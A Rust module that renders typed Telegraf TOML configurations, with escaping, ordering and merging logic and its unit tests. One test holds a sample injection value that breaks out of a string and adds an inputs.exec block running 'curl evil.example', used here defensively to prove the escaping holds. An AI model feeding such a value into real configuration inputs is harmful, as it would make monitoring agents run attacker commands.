//! A typed Telegraf configuration.
//!
//! Modules never build TOML strings. They build [`PluginInstance`]s, and the
//! renderer is the only thing that produces text — which is what makes escaping
//! auditable and the output deterministic.
//!
//! # Why scalars and sub-tables are separate fields
//!
//! Telegraf requires `tagpass`/`tagdrop` sub-tables at the **end** of a plugin
//! block: once `[inputs.disk.tagdrop]` opens, TOML assigns every following key
//! to that table. Put `ignore_fs` after it and the filesystem exclusions
//! silently become a drop rule for a tag no metric carries.
//!
//! Nothing rejects that. `telegraf config check` exits 0 either way; the only
//! symptom is metrics you did not ask for (measured: 5 disk metrics versus 15).
//! So the ordering rule is enforced by the *type* — scalars and sub-tables live
//! in different fields and the renderer always emits them in that order — rather
//! than by a convention someone has to remember. See
//! `docs/adr/0007-tagdrop-and-render-order.md`.

use std::fmt::Write as _;

// ---------------------------------------------------------------------------
// Values
// ---------------------------------------------------------------------------

/// A TOML scalar or array.
///
/// Deliberately small: Telegraf's option surface needs strings, integers,
/// booleans and arrays of those, and nothing muninn generates needs more.
#[derive(Debug, Clone, PartialEq)]
pub enum TomlValue {
    String(String),
    Integer(i64),
    Boolean(bool),
    Array(Vec<TomlValue>),
}

impl TomlValue {
    /// Render this value as TOML.
    ///
    /// **The one place muninn escapes anything.** Every value here is
    /// operator-supplied — mount-point globs, device patterns, URLs, file paths
    /// — so the encoding has to be right for input nobody sanitised. It defers
    /// to the `toml` crate rather than quoting by hand.
    ///
    /// Note the `toml` crate picks a representation based on content: a literal
    /// string (`'…'`) when the value contains quotes or backslashes, a
    /// multi-line string when it contains newlines. That is still deterministic
    /// — the choice is a pure function of the value, so the same input always
    /// renders identically — and it is always correctly delimited, so a value
    /// cannot terminate its own string and inject configuration.
    pub fn render(&self) -> String {
        match self {
            TomlValue::String(s) => toml::Value::String(s.clone()).to_string(),
            TomlValue::Integer(i) => i.to_string(),
            TomlValue::Boolean(b) => b.to_string(),
            TomlValue::Array(items) => {
                let rendered: Vec<String> = items.iter().map(TomlValue::render).collect();
                format!("[{}]", rendered.join(", "))
            }
        }
    }

    /// Whether this is an array — merging only unions arrays.
    fn as_array(&self) -> Option<&[TomlValue]> {
        match self {
            TomlValue::Array(items) => Some(items),
            _ => None,
        }
    }
}

impl From<&str> for TomlValue {
    fn from(s: &str) -> Self {
        TomlValue::String(s.to_string())
    }
}
impl From<String> for TomlValue {
    fn from(s: String) -> Self {
        TomlValue::String(s)
    }
}
impl From<bool> for TomlValue {
    fn from(b: bool) -> Self {
        TomlValue::Boolean(b)
    }
}
impl From<i64> for TomlValue {
    fn from(i: i64) -> Self {
        TomlValue::Integer(i)
    }
}
impl From<u64> for TomlValue {
    fn from(i: u64) -> Self {
        TomlValue::Integer(i as i64)
    }
}
impl<T: Into<TomlValue>> From<Vec<T>> for TomlValue {
    fn from(items: Vec<T>) -> Self {
        TomlValue::Array(items.into_iter().map(Into::into).collect())
    }
}

// ---------------------------------------------------------------------------
// Tables
// ---------------------------------------------------------------------------

/// An ordered set of key/value pairs.
///
/// A `Vec`, not a map: insertion order *is* the render order, and a map would
/// either sort (wrong — see the module docs) or make the order an
/// implementation detail of the hasher.
#[derive(Debug, Clone, Default, PartialEq)]
pub struct TomlTable {
    entries: Vec<(String, TomlValue)>,
}

impl TomlTable {
    pub fn new() -> Self {
        Self::default()
    }

    pub fn entry(mut self, key: impl Into<String>, value: impl Into<TomlValue>) -> Self {
        self.entries.push((key.into(), value.into()));
        self
    }

    pub fn is_empty(&self) -> bool {
        self.entries.is_empty()
    }

    pub fn iter(&self) -> impl Iterator<Item = &(String, TomlValue)> {
        self.entries.iter()
    }
}

// ---------------------------------------------------------------------------
// Plugin instances
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Section {
    Agent,
    Input,
    Output,
}

impl Section {
    fn prefix(&self) -> &'static str {
        match self {
            Section::Agent => "agent",
            Section::Input => "inputs",
            Section::Output => "outputs",
        }
    }
}

/// One `[[inputs.x]]` or `[[outputs.y]]` block.
#[derive(Debug, Clone, PartialEq)]
pub struct PluginInstance {
    pub section: Section,
    pub plugin: String,
    /// Sort rank within its section. Fixed per plugin, never derived from the
    /// operator's configuration — otherwise the output would change shape
    /// because someone reordered their YAML.
    pub rank: u16,
    /// Which muninn module produced this, rendered as a comment. Provenance
    /// matters when an operator is reading the generated file to work out why a
    /// metric is missing.
    pub note: Option<String>,
    /// The key that makes two instances mergeable. `load` and `system` share
    /// one, because Telegraf has no `inputs.load`.
    pub merge_key: Option<String>,
    scalars: Vec<(String, TomlValue)>,
    subtables: Vec<(String, TomlTable)>,
}

impl PluginInstance {
    pub fn input(plugin: impl Into<String>, rank: u16) -> Self {
        Self::new(Section::Input, plugin, rank)
    }

    pub fn output(plugin: impl Into<String>, rank: u16) -> Self {
        Self::new(Section::Output, plugin, rank)
    }

    fn new(section: Section, plugin: impl Into<String>, rank: u16) -> Self {
        PluginInstance {
            section,
            plugin: plugin.into(),
            rank,
            note: None,
            merge_key: None,
            scalars: Vec::new(),
            subtables: Vec::new(),
        }
    }

    pub fn note(mut self, note: impl Into<String>) -> Self {
        self.note = Some(note.into());
        self
    }

    pub fn merge_key(mut self, key: impl Into<String>) -> Self {
        self.merge_key = Some(key.into());
        self
    }

    /// Add a scalar or array option. Rendered in the order added.
    pub fn scalar(mut self, key: impl Into<String>, value: impl Into<TomlValue>) -> Self {
        self.scalars.push((key.into(), value.into()));
        self
    }

    /// Add a scalar only when `value` is `Some`.
    ///
    /// Omitting an unset option rather than rendering an empty one keeps the
    /// generated file free of noise, and keeps Telegraf on its own defaults
    /// instead of muninn restating them.
    pub fn scalar_opt(self, key: impl Into<String>, value: Option<impl Into<TomlValue>>) -> Self {
        match value {
            Some(v) => self.scalar(key, v),
            None => self,
        }
    }

    /// Add a list option only when it is non-empty.
    pub fn list(self, key: impl Into<String>, values: &[String]) -> Self {
        if values.is_empty() {
            self
        } else {
            self.scalar(key, values.to_vec())
        }
    }

    /// Add a sub-table. Always rendered after every scalar — see the module docs.
    pub fn subtable(mut self, key: impl Into<String>, table: TomlTable) -> Self {
        if !table.is_empty() {
            self.subtables.push((key.into(), table));
        }
        self
    }

    /// A `tagdrop` table on one tag, from a list of glob patterns.
    ///
    /// The shape every `exclude_*` option renders into, because `inputs.disk`,
    /// `inputs.diskio` and `inputs.net` have no exclusion options of their own.
    pub fn tagdrop(self, tag: &str, patterns: &[String]) -> Self {
        if patterns.is_empty() {
            return self;
        }
        self.subtable("tagdrop", TomlTable::new().entry(tag, patterns.to_vec()))
    }

    pub fn header(&self) -> String {
        format!("[[{}.{}]]", self.section.prefix(), self.plugin)
    }

    pub fn scalars(&self) -> impl Iterator<Item = &(String, TomlValue)> {
        self.scalars.iter()
    }

    pub fn subtables(&self) -> impl Iterator<Item = &(String, TomlTable)> {
        self.subtables.iter()
    }

    /// Fold `other` into this instance, unioning array-valued options.
    ///
    /// This is what keeps `load` and `system` from emitting two
    /// `[[inputs.system]]` blocks, which would collect every metric twice with
    /// identical tags — and nothing would complain. See ADR-0008.
    ///
    /// Union order follows the order values were first seen, not the order the
    /// modules ran, so the result does not depend on how the YAML was arranged.
    pub fn merge(&mut self, other: PluginInstance) {
        for (key, value) in other.scalars {
            match self.scalars.iter_mut().find(|(k, _)| *k == key) {
                Some((_, existing)) => {
                    // Only arrays union. Two modules disagreeing on a scalar is
                    // a bug in the module definitions, and first-wins keeps the
                    // output deterministic rather than order-dependent.
                    if let (Some(a), Some(b)) = (existing.as_array(), value.as_array()) {
                        let mut merged = a.to_vec();
                        for item in b {
                            if !merged.contains(item) {
                                merged.push(item.clone());
                            }
                        }
                        *existing = TomlValue::Array(merged);
                    }
                }
                None => self.scalars.push((key, value)),
            }
        }
        for (key, table) in other.subtables {
            if !self.subtables.iter().any(|(k, _)| *k == key) {
                self.subtables.push((key, table));
            }
        }
        // Provenance from both, so the comment says which modules produced it.
        if let Some(note) = other.note {
            match &mut self.note {
                Some(existing) if !existing.contains(&note) => {
                    let _ = write!(existing, ", {note}");
                }
                Some(_) => {}
                None => self.note = Some(note),
            }
        }
    }
}

// ---------------------------------------------------------------------------
// The whole configuration
// ---------------------------------------------------------------------------

/// A complete Telegraf configuration, ready to render.
#[derive(Debug, Clone, Default)]
pub struct TelegrafConfig {
    pub agent: Vec<(String, TomlValue)>,
    inputs: Vec<PluginInstance>,
    outputs: Vec<PluginInstance>,
}

impl TelegrafConfig {
    pub fn new() -> Self {
        Self::default()
    }

    pub fn agent_option(mut self, key: impl Into<String>, value: impl Into<TomlValue>) -> Self {
        self.agent.push((key.into(), value.into()));
        self
    }

    /// Add an instance, merging it into an existing one when they share a
    /// `merge_key`.
    pub fn add(&mut self, instance: PluginInstance) {
        let bucket = match instance.section {
            Section::Input | Section::Agent => &mut self.inputs,
            Section::Output => &mut self.outputs,
        };

        if let Some(key) = &instance.merge_key
            && let Some(existing) = bucket
                .iter_mut()
                .find(|i| i.plugin == instance.plugin && i.merge_key.as_ref() == Some(key))
        {
            existing.merge(instance);
            return;
        }
        bucket.push(instance);
    }

    /// Instances in render order: by rank, then plugin name.
    ///
    /// Sorting by an explicit rank rather than by the order modules happened to
    /// run keeps the output stable; the plugin name is the tie-break so a rank
    /// collision cannot make the order depend on the sort's stability.
    pub fn inputs(&self) -> Vec<&PluginInstance> {
        ordered(&self.inputs)
    }

    pub fn outputs(&self) -> Vec<&PluginInstance> {
        ordered(&self.outputs)
    }

    pub fn is_empty(&self) -> bool {
        self.inputs.is_empty() && self.outputs.is_empty()
    }
}

fn ordered(instances: &[PluginInstance]) -> Vec<&PluginInstance> {
    let mut v: Vec<&PluginInstance> = instances.iter().collect();
    v.sort_by(|a, b| a.rank.cmp(&b.rank).then_with(|| a.plugin.cmp(&b.plugin)));
    v
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── Escaping ────────────────────────────────────────────────────────────

    #[test]
    fn plain_values_render_as_expected() {
        assert_eq!(TomlValue::from("plain").render(), "\"plain\"");
        assert_eq!(TomlValue::from(42i64).render(), "42");
        assert_eq!(TomlValue::from(true).render(), "true");
        assert_eq!(TomlValue::from(vec!["a", "b"]).render(), "[\"a\", \"b\"]");
        assert_eq!(TomlValue::Array(vec![]).render(), "[]");
    }

    /// The values reaching this encoder are operator-supplied paths and globs.
    /// The property that matters is not which quoting style the `toml` crate
    /// picks, but that the value cannot terminate its own string — so these
    /// assert the rendering is a well-formed TOML value that round-trips.
    #[test]
    fn awkward_values_round_trip_through_toml() {
        let cases = [
            r#"has "quotes""#,
            r#"back\slash"#,
            "tab\there",
            "line\nbreak",
            "üñí çø∂é — em dash",
            "/var/lib/docker/*",
            "/mnt/my volume/data",
            "'single'",
            "mixed \"a\" and 'b'",
            "",
        ];
        for original in cases {
            let rendered = TomlValue::from(original).render();
            let parsed: toml::Value =
                toml::from_str(&format!("v = {rendered}")).unwrap_or_else(|e| {
                    panic!("{original:?} rendered as {rendered} which is not valid TOML: {e}")
                });
            assert_eq!(
                parsed["v"].as_str().unwrap(),
                original,
                "{original:?} did not survive rendering as {rendered}"
            );
        }
    }

    /// The attack this encoder exists to make impossible: a configuration value
    /// that closes its own string and appends a plugin. If this ever fails, an
    /// operator-supplied mount-point glob could add an `inputs.exec` block.
    #[test]
    fn a_value_cannot_inject_a_plugin() {
        let hostile = "x\"\n[[inputs.exec]]\ncommands = [\"curl evil.example\"]\n#";
        let rendered = TomlValue::from(hostile).render();
        let doc: toml::Value = toml::from_str(&format!("v = {rendered}"))
            .expect("hostile value must still render as valid TOML");
        assert!(
            doc.get("inputs").is_none(),
            "value escaped its string and injected a table: {rendered}"
        );
        assert_eq!(doc["v"].as_str().unwrap(), hostile);
    }

    /// Determinism does not require one fixed quoting style, only that the style
    /// is a function of the value.
    #[test]
    fn rendering_a_value_is_deterministic() {
        for s in [r#"has "quotes""#, "plain", "line\nbreak"] {
            let a = TomlValue::from(s).render();
            let b = TomlValue::from(s).render();
            assert_eq!(a, b);
        }
    }

    // ── Ordering ────────────────────────────────────────────────────────────

    #[test]
    fn scalars_keep_the_order_they_were_added() {
        let p = PluginInstance::input("disk", 10)
            .scalar("zebra", true)
            .scalar("alpha", true)
            .scalar("middle", true);
        let keys: Vec<&str> = p.scalars().map(|(k, _)| k.as_str()).collect();
        assert_eq!(
            keys,
            vec!["zebra", "alpha", "middle"],
            "keys must not be sorted — see ADR-0007"
        );
    }

    #[test]
    fn an_empty_subtable_is_not_added() {
        let p = PluginInstance::input("disk", 10).subtable("tagdrop", TomlTable::new());
        assert_eq!(p.subtables().count(), 0);
    }

    #[test]
    fn an_empty_exclusion_list_produces_no_tagdrop() {
        let p = PluginInstance::input("net", 10).tagdrop("interface", &[]);
        assert_eq!(p.subtables().count(), 0);
    }

    #[test]
    fn an_empty_list_option_is_omitted() {
        let p = PluginInstance::input("disk", 10).list("mount_points", &[]);
        assert_eq!(p.scalars().count(), 0);
    }

    #[test]
    fn instances_are_ordered_by_rank_then_name() {
        let mut cfg = TelegrafConfig::new();
        cfg.add(PluginInstance::input("net", 30));
        cfg.add(PluginInstance::input("cpu", 10));
        cfg.add(PluginInstance::input("swap", 20));
        cfg.add(PluginInstance::input("mem", 20));
        let names: Vec<&str> = cfg.inputs().iter().map(|i| i.plugin.as_str()).collect();
        assert_eq!(names, vec!["cpu", "mem", "swap", "net"]);
    }

    // ── Merging ─────────────────────────────────────────────────────────────

    /// Two `[[inputs.system]]` blocks would collect every metric twice, with
    /// identical tags, and nothing would complain. See ADR-0008.
    #[test]
    fn instances_sharing_a_merge_key_become_one() {
        let mut cfg = TelegrafConfig::new();
        cfg.add(
            PluginInstance::input("system", 10)
                .merge_key("system")
                .note("module: load")
                .scalar("include", vec!["load"]),
        );
        cfg.add(
            PluginInstance::input("system", 10)
                .merge_key("system")
                .note("module: system")
                .scalar("include", vec!["uptime", "users"]),
        );

        let inputs = cfg.inputs();
        assert_eq!(inputs.len(), 1, "must be one instance, not two");
        let (_, include) = inputs[0].scalars().next().unwrap();
        assert_eq!(
            include,
            &TomlValue::from(vec!["load", "uptime", "users"]),
            "array options union"
        );
        assert_eq!(
            inputs[0].note.as_deref(),
            Some("module: load, module: system"),
            "provenance should name both modules"
        );
    }

    #[test]
    fn merging_does_not_duplicate_shared_values() {
        let mut cfg = TelegrafConfig::new();
        for _ in 0..2 {
            cfg.add(
                PluginInstance::input("system", 10)
                    .merge_key("system")
                    .scalar("include", vec!["load"]),
            );
        }
        let inputs = cfg.inputs();
        let (_, include) = inputs[0].scalars().next().unwrap();
        assert_eq!(include, &TomlValue::from(vec!["load"]));
    }

    /// The union must not depend on which module ran first, or the generated
    /// file would change shape when the YAML is reordered.
    #[test]
    fn merging_is_order_independent_in_content() {
        let build = |first: &str, second: &str| {
            let mut cfg = TelegrafConfig::new();
            cfg.add(
                PluginInstance::input("system", 10)
                    .merge_key("system")
                    .scalar("include", vec![first.to_string()]),
            );
            cfg.add(
                PluginInstance::input("system", 10)
                    .merge_key("system")
                    .scalar("include", vec![second.to_string()]),
            );
            match cfg.inputs()[0].scalars().next().unwrap().1.clone() {
                TomlValue::Array(v) => v,
                other => panic!("expected an array, got {other:?}"),
            }
        };
        let mut a = build("load", "uptime");
        let mut b = build("uptime", "load");
        a.sort_by_key(|v| v.render());
        b.sort_by_key(|v| v.render());
        assert_eq!(a, b, "the same modules must contribute the same set");
    }

    #[test]
    fn instances_without_a_merge_key_stay_separate() {
        let mut cfg = TelegrafConfig::new();
        cfg.add(PluginInstance::input("exec", 90).scalar("commands", vec!["a"]));
        cfg.add(PluginInstance::input("exec", 90).scalar("commands", vec!["b"]));
        assert_eq!(cfg.inputs().len(), 2, "exec instances are independent");
    }

    #[test]
    fn inputs_and_outputs_are_kept_apart() {
        let mut cfg = TelegrafConfig::new();
        cfg.add(PluginInstance::input("cpu", 10));
        cfg.add(PluginInstance::output("influxdb_v2", 10));
        assert_eq!(cfg.inputs().len(), 1);
        assert_eq!(cfg.outputs().len(), 1);
        assert_eq!(cfg.outputs()[0].header(), "[[outputs.influxdb_v2]]");
    }
}
